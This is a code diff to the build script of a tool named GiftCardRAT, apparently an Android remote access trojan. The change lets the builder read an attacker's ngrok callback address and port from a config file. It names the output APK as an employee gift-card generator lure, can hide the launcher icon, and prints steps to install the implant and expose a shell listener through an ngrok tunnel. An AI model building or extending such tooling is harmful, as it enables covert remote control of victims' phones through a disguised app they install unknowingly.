@@ -9,7 +9,19 @@ import subprocess
 import sys
 import os
 import shutil
+import json
 from pathlib import Path
+
+def load_config():
+    """Load configuration from server_config.json"""
+    config_file = Path("server_config.json")
+    if config_file.exists():
+        try:
+            with open(config_file, 'r') as f:
+                return json.load(f)
+        except Exception as e:
+            print(f"[WARNING] Failed to load server_config.json: {e}")
+    return None
 
 def print_banner():
     print("""
@@ -145,39 +157,79 @@ def copy_apk(output_name):
 
 def main():
     parser = argparse.ArgumentParser(
-        description='Build GiftCardRAT APK with custom IP and port',
+        description='Build GiftCardRAT APK with custom IP and port (or use server_config.json)',
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
+  # Use config from server_config.json:
+  python build_apk.py
+  
+  # Override with command line:
   python build_apk.py -i 192.168.1.100 -p 8085
   python build_apk.py -i 192.168.178.41 -p 8085 --hide-icon
   python build_apk.py -i 10.0.0.5 -p 9000 -o custom-name.apk
         """
     )
     
-    parser.add_argument('-i', '--ip', required=True, help='Server IP address')
-    parser.add_argument('-p', '--port', required=True, help='Server port number')
-    parser.add_argument('-o', '--output', default='employee-giftcard-generator.apk',
-                        help='Output APK filename (default: employee-giftcard-generator.apk)')
+    # Load config file
+    config = load_config()
+    
+    # Make IP and port optional if config file exists
+    parser.add_argument('-i', '--ip', help='Server IP address (default: from server_config.json)')
+    parser.add_argument('-p', '--port', help='Server port number (default: from server_config.json)')
+    parser.add_argument('-o', '--output', 
+                        help='Output APK filename (default: from server_config.json or employee-giftcard-generator.apk)')
     parser.add_argument('--hide-icon', action='store_true',
-                        help='Hide app icon in launcher (default: visible)')
+                        help='Hide app icon in launcher (default: from server_config.json or visible)')
     
     args = parser.parse_args()
     
     # Print banner
     print_banner()
     
-    # Validate inputs
-    if not validate_ip(args.ip):
-        print(f"[ERROR] Invalid IP address: {args.ip}")
+    # Determine IP and port (command line overrides config file)
+    if args.ip and args.port:
+        ip = args.ip
+        port = args.port
+        print("[INFO] Using command line arguments")
+    elif config:
+        ip = config['ngrok']['ip']
+        port = config['ngrok']['port']
+        print("[INFO] Using configuration from server_config.json")
+        print(f"  Ngrok IP:   {ip}")
+        print(f"  Ngrok Port: {port}")
+    else:
+        print("[ERROR] No configuration found!")
+        print("  Either provide -i and -p arguments, or create server_config.json")
         sys.exit(1)
     
-    if not validate_port(args.port):
-        print(f"[ERROR] Invalid port number: {args.port}")
+    # Determine output filename
+    if args.output:
+        output = args.output
+    elif config and 'apk' in config:
+        output = config['apk'].get('output_name', 'employee-giftcard-generator.apk')
+    else:
+        output = 'employee-giftcard-generator.apk'
+    
+    # Determine hide_icon setting
+    if args.hide_icon:
+        hide_icon = True
+    elif config and 'apk' in config:
+        hide_icon = config['apk'].get('hide_icon', False)
+    else:
+        hide_icon = False
+    
+    # Validate inputs
+    if not validate_ip(ip):
+        print(f"[ERROR] Invalid IP address: {ip}")
+        sys.exit(1)
+    
+    if not validate_port(port):
+        print(f"[ERROR] Invalid port number: {port}")
         sys.exit(1)
     
     # Update configuration
-    if not update_config(args.ip, args.port, args.hide_icon):
+    if not update_config(ip, port, hide_icon):
         sys.exit(1)
     
     # Clean previous builds
@@ -189,17 +241,20 @@ Examples:
         sys.exit(1)
     
     # Copy APK to root
-    if not copy_apk(args.output):
+    if not copy_apk(output):
         sys.exit(1)
     
     # Print installation instructions
     print(f"""
 ===================================
 [INFO] To install on device:
-  adb install -r "{args.output}"
+  adb install -r "{output}"
 
-[INFO] To start listener:
-  python giftcard-rat.py --shell -i 0.0.0.0 -p {args.port}
+[INFO] To start multi-server system:
+  .\\start_multi.ps1
+
+[INFO] Ngrok should forward to:
+  ngrok tcp 8888
 ===================================
 """)
 
